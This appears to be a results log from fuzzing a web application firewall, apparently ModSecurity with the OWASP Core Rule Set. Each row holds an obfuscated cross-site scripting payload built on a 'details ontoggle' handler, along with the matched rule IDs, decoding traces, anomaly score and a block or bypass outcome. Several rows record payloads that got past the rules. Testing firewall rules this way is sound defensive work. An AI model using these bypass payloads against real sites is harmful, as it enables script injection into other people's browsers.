795,"<details open ontoggle=""Function('al'+'ert(15)')()""></details>",0,1,block,5,"941100,941120,942100,942100,949110","v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,62 || v217,62t:urlDecodeUni || ",20,177603383355.051843
796,"<details open ontoggle=""new window['Function']('al'+'ert(15)')()""></details>",0,1,block,5,"933210,941100,941120,941370,949110","o34,30v217,76t:urlDecode,t:replaceComments,t:compressWhitespace || v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,18v217,76t:urlDecodeUni,t:compressWhitespace || ",20,177603383420.657333
797,"<details open ontoggle=""new(Function)('al'+'ert(15)')()""></details>",0,1,block,4,"933210,941100,941120,949110","o27,28v217,67t:urlDecode,t:replaceComments,t:compressWhitespace || v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,67t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603383590.745378
799,"<details open ontoggle=""new top['Function']('al'+'ert(15)')()""></details>",0,1,block,5,"933210,941100,941120,941370,949110","o31,30v217,73t:urlDecode,t:replaceComments,t:compressWhitespace || v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,73t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,15v217,73t:urlDecodeUni,t:compressWhitespace || ",20,17760338373.644309
800,"<details open ontoggle=""new self['Function']('al'+'ert(15)')()""></details>",0,1,block,5,"933210,941100,941120,941370,949110","o32,30v217,74t:urlDecode,t:replaceComments,t:compressWhitespace || v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,16v217,74t:urlDecodeUni,t:compressWhitespace || ",20,177603383854.309288
802,"<details open ontoggle=""new Function(String.fromCharCode(97,108,101,114,116,40,49,53,41))()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,103 || v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603384032.693964
803,"<details open ontoggle=""new Function(atob('YWxlcnQoMTUp'))()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,72 || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603384196.086629
804,"<details open ontoggle=""new Function('al\x65rt(15)')()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,66 || v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603384281.021097
805,"<details open ontoggle=""new Function('al\u0065rt(15)')()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,68 || v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603384326.617229
806,"<details open ontoggle=""new Function(['al'+'ert',['(15)']].join(''))()""></details>",0,1,block,5,"934100,934100,941100,941120,949110","o24,13v217,82 || o24,13v217,82t:urlDecodeUni || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603384415.135443
807,"<details open ontoggle=""new Function('al'/**/.concat('ert(15)'))()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,78 || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603384555.374678
808,"<details open ontoggle=""new Function('al'.concat('ert(15)'))()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,74 || v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,74t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603384671.927839
809,"<details open ontoggle=""new Function(['al','ert','(15)'].join(''))()""></details>",0,1,block,4,"934100,941100,941120,949110","o24,13v217,80 || v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,80t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603384728.071107
810,"<details open ontoggle=""new/**/Function('al'+'ert(15)')()""></details>",0,1,bypass,2,"941100,941120","v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,17760338481.201067
811,"<details open ontoggle=""new&#9;Function('al'+'ert(15)')()""></details>",0,1,bypass,2,"941100,941120","v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603384998.953360
812,"<details open ontoggle=""new&#10;Function('al'+'ert(15)')()""></details>",0,1,bypass,2,"941100,941120","v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603385079.135327
813,"<details open ontoggle=""new Function('al'+String.fromCharCode(101)+'rt(15)')()""></details>",0,1,block,5,"934100,934100,941100,941120,949110","o24,13v217,90 || o24,13v217,90t:urlDecodeUni || v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,90t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,17760338519.329372
814,"<details open ontoggle=""new (window.Function)('al'+'ert(15)')()""></details>",0,1,block,4,"933210,941100,941120,949110","o28,35v217,75t:urlDecode,t:replaceComments,t:compressWhitespace || v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603385281.447277
815,"<details open ontoggle=""new Function('al'+String['fromCharCode'](101)+'rt(1)')()"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o36,44v217,82t:urlDecode,t:replaceComments,t:compressWhitespace || o24,13v217,82 || o24,13v217,82t:urlDecodeUni || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,17760338534.844228
816,"<details open ontoggle=""new Function(['al','ert(1)'].join``)()"">",0,1,block,4,"934100,941100,941120,949110","o24,13v217,64 || v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603385447.237986
818,"<details open ontoggle=""new Function(atob('YWxlcnQoMSk'))()"">",0,1,block,4,"934100,941100,941120,949110","o24,13v216,61 || v216,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603385650.187789
821,"<details open ontoggle=""new Function('al'+'e'+'r'+'t'+String.fromCharCode(40)+'1'+String.fromCharCode(41))()"">",0,1,block,5,"934100,934100,941100,941120,949110","o24,13v217,110 || o24,13v217,110t:urlDecodeUni || v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603385921.425914
824,"<details open ontoggle=""new Function('al\145rt(1)')()"">",0,1,block,4,"934100,941100,941120,949110","o24,13v216,55 || v216,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603386260.146578
825,"<details open ontoggle=""new/**/Function/**/('al'+'ert(1)')()"">",0,1,bypass,2,"941100,941120","v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603386324.299724
826,"<details open ontoggle=""new Function([97,108,101,114,116,40,49,41].map(x=>String.fromCharCode(x)).join(''))()"">",0,1,block,4,"934100,941100,941120,949110","o24,13v217,111 || v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603386441.404377
827,"<details open ontoggle=""(function(){return this.constructor.constructor('al'+'ert(1)')()})()"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,68v217,94t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,94 || o25,11v217,94t:urlDecodeUni || v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,17760338659.337592
829,"<details open ontoggle=""new Function('al\x65rt\u00281\u0029')()"">",0,1,block,4,"934100,941100,941120,949110","o24,13v217,65 || v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603386716.334815
832,"<details open ontoggle=""Function('ale'+'rt(1)')()""></details>",0,1,block,5,"941100,941120,942100,942100,949110","v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v217,61 || v217,61t:urlDecodeUni || ",20,177603387018.992098
835,"<details open ontoggle=""(()=>{return Function})()('ale'+'rt(1)')()""></details>",0,1,bypass,2,"941100,941120","v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603387347.436886
836,"<details open ontoggle=""[].filter['constructor']('ale'+'rt(1)')()""></details>",0,1,block,4,"933210,941100,941120,949110","o24,41v217,77t:urlDecode,t:replaceComments,t:compressWhitespace || v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,77t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603387484.785073
837,"<details open ontoggle=""''.constructor['constructor']('ale'+'rt(1)')()""></details>",0,1,block,4,"933210,941100,941120,949110","o38,32v217,82t:urlDecode,t:replaceComments,t:compressWhitespace || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603387596.120296
842,"<details open ontoggle=""Object['constructor']['constructor']('ale'+'rt(1)')()""></details>",0,1,block,4,"933210,941100,941120,949110","o30,47v217,89t:urlDecode,t:replaceComments,t:compressWhitespace || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603388063.094818
844,"<details open ontoggle=""(0,Function)('ale'+'rt(1)')()""></details>",0,1,bypass,2,"941100,941120","v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603388214.276947
846,"<details open ontoggle=""new Function(String.fromCharCode(101,118,97,108,40,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,57,55,44,49,48,56,44,49,48,49,44,49,49,52,44,49,49,54,44,52,48,44,52,57,44,52,49,41,41))()"">",0,1,block,4,"934100,941100,941120,949110","o24,13v217,241 || v217,241t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,241t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603388425.929983
849,"<details open ontoggle=""new Function`eval(String.fromCharCode(97,108,101,114,116,40,49,41))`()"">",0,1,block,6,"932100,933160,934100,941100,941120,949110","o36,5v217,96 || o37,57v217,96 || o37,5v217,96 || v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603388715.808422
851,"<details open ontoggle=""new(Function)(String.fromCharCode(101,118,97,108,40,83,116,114,105,110,103,46,102,114,111,109,67,104,97,114,67,111,100,101,40,57,55,44,49,48,56,44,49,48,49,44,49,49,52,44,49,49,54,44,52,48,44,52,57,44,52,49,41,41))()"">",0,1,block,5,"933210,934100,941100,941120,949110","o27,213v217,242t:urlDecode,t:replaceComments,t:compressWhitespace || o38,19v217,242 || v217,242t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,242t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603388990.021222
854,"<details open ontoggle=""Function(String.fromCharCode(97)+String.fromCharCode(108)+String.fromCharCode(101)+String.fromCharCode(114)+String.fromCharCode(116)+String.fromCharCode(40)+String.fromCharCode(49)+String.fromCharCode(41))()"">",0,1,block,5,"934100,934100,941100,941120,949110","o33,19v217,233 || o33,19v217,233t:urlDecodeUni || v217,233t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,233t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603389271.547484
857,"<details open ontoggle=""new Function(unescape('%61%6c%65%72%74%28%31%29'))()"">",0,1,block,5,"934100,934100,941100,941120,949110","o24,13v217,78 || o24,13v217,78t:urlDecodeUni || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603389531.967189
858,"<details open ontoggle=""new&#10;Function(String.fromCharCode(97,108,101,114,116,40,49,41))()"">",0,1,block,4,"934100,941100,941120,949110","o41,19v217,94 || v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603389614.069869
860,"<details open ontoggle=""new globalThis.Function(String.fromCharCode(97,108,101,114,116,40,49,41))()"">",0,1,block,4,"934100,941100,941120,949110","o48,19v217,101 || v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,101t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603389838.097817
861,"<details open ontoggle=""new Function(String[`fromCharCode`](97,108,101,114,116,40,49,41))()"">",0,1,block,4,"934100,941100,941120,949110","o24,13v217,93 || v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,93t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603389980.811064
863,"<details open ontoggle=""new Function(String.fromCharCode(0x61,0x6c,0x65,0x72,0x74,0x28,0x31,0x29))()"">",0,1,block,4,"934100,941100,941120,949110","o24,13v217,102 || v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,102t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603390115.473133
864,"<details open ontoggle=""new parent.Function(String.fromCharCode(97,108,101,114,116,40,49,41))()"">",0,1,block,4,"934100,941100,941120,949110","o44,19v217,97 || v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603390280.607445
865,"<details open ontoggle=""new Function([String.fromCharCode(97,108,101,114,116),String.fromCharCode(40,49,41)].join(''))()"">",0,1,block,4,"934100,941100,941120,949110","o24,13v217,122 || v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,122t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603390318.326060
866,"<details open ontoggle=""new Function('return al'+String.fromCharCode(101)+'rt')()(1)"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o36,48v217,86t:urlDecode,t:replaceComments,t:compressWhitespace || o24,13v217,86 || o24,13v217,86t:urlDecodeUni || v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177603390487.568364
867,"<details open ontoggle=""new Function(String.fromCharCode(114,101,116,117,114,110,32,97,108,101,114,116))()(1)"">",0,1,block,4,"934100,941100,941120,949110","o24,13v217,111 || v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603390537.241173
869,"<details open ontoggle=""new Function(atob('cmV0dXJuIGFsZXJ0'))()(1)"">",0,1,block,5,"933210,934100,941100,941120,949110","o36,31v217,69t:urlDecode,t:replaceComments,t:compressWhitespace || o24,13v217,69 || v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603390786.196280
871,"<details open ontoggle=""[].constructor.constructor('return ale'+'rt')()(1)"">",0,1,block,4,"933210,941100,941120,949110","o24,50v217,76t:urlDecode,t:replaceComments,t:compressWhitespace || v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17760339095.371279
874,"<details open ontoggle=""Function('return\x20alert')()(1)"">",0,1,block,4,"941100,941120,942100,949110","v216,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || v216,58 || ",15,177603391260.862041
876,"<details open ontoggle=""new Function('return al\x65rt')()(1)"">",0,1,block,4,"934100,941100,941120,949110","o24,13v216,62 || v216,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603391413.472457
880,"<details open ontoggle=""new Function('return\tal\145rt')()(1)"">",0,1,block,4,"934100,941100,941120,949110","o24,13v217,63 || v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603391823.080349
882,"<details open ontoggle=""new Function(['r','e','t','u','r','n',' ','a','l','e','r','t'].join(''))()(1)"">",0,1,block,5,"933210,934100,941100,941120,949110","o91,10v217,103t:urlDecode,t:replaceComments,t:compressWhitespace || o24,13v217,103 || v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603392195.195149
885,"<details open ontoggle=""new Function('return\u0020alert')()(1)"">",0,1,block,4,"934100,941100,941120,949110","o24,13v217,64 || v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,64t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603392413.604084
887,"<details open ontoggle=""new window['Function'](atob('YWxlcnQoMSk='))()""></details>",0,1,block,5,"933210,941100,941120,941370,949110","o34,36v217,82t:urlDecode,t:replaceComments,t:compressWhitespace || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o28,18v217,82t:urlDecodeUni,t:compressWhitespace || ",20,177603392679.748830
893,"<details open ontoggle=""new Function(decodeURI('%61%6c%65%72%74%28%31%29'))()""></details>",0,1,block,5,"934100,934100,941100,941120,949110","o24,13v217,89 || o24,13v217,89t:urlDecodeUni || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603393240.653718
895,"<details open ontoggle=""new parent['Function']('al\145rt(1)')()""></details>",0,1,block,4,"933210,941100,941120,949110","o34,29v217,75t:urlDecode,t:replaceComments,t:compressWhitespace || v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603393448.057491
897,"<details open ontoggle=""globalThis['Function']('aler'+'t(1)')()""></details>",0,1,block,4,"933210,941100,941120,949110","o34,29v217,75t:urlDecode,t:replaceComments,t:compressWhitespace || v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603393684.349216
898,"<details open ontoggle=""new Function(unescape('%61%6C%65%72%74%281%29'))()""></details>",0,1,block,5,"934100,934100,941100,941120,949110","o24,13v217,86 || o24,13v217,86t:urlDecodeUni || v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177603393728.703897
904,"<details open ontoggle=""(function(){return Function(atob('YWxlcnQoMSk='))})()()"">",0,1,block,4,"934100,941100,941120,949110","o25,11v217,81 || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17760339445.873692
909,"<details open ontoggle=""self['Function'](atob('YWxlcnQoMSk='))()"">",0,1,block,5,"933210,941100,941120,941370,949110","o28,36v217,66t:urlDecode,t:replaceComments,t:compressWhitespace || v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,16v217,66t:urlDecodeUni,t:compressWhitespace || ",20,177603394920.733383
910,"<details open ontoggle=""parent['Function'](atob('YWxlcnQoMSk='))()"">",0,1,block,4,"933210,941100,941120,949110","o30,36v217,68t:urlDecode,t:replaceComments,t:compressWhitespace || v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603395079.853413
911,"<details open ontoggle=""globalThis['Function'](atob('YWxlcnQoMSk='))()"">",0,1,block,4,"933210,941100,941120,949110","o34,36v217,72t:urlDecode,t:replaceComments,t:compressWhitespace || v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603395140.257797
912,"<details open ontoggle=""(()=>Function(atob('YWxlcnQoMSk='))())()"">",0,1,bypass,2,"941100,941120","v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177603395282.809624
913,"<details open ontoggle=""new Function(atob`YWxlcnQoMSk=`)()"">",0,1,block,4,"934100,941100,941120,949110","o24,13v216,60 || v216,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,60t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177603395319.179156
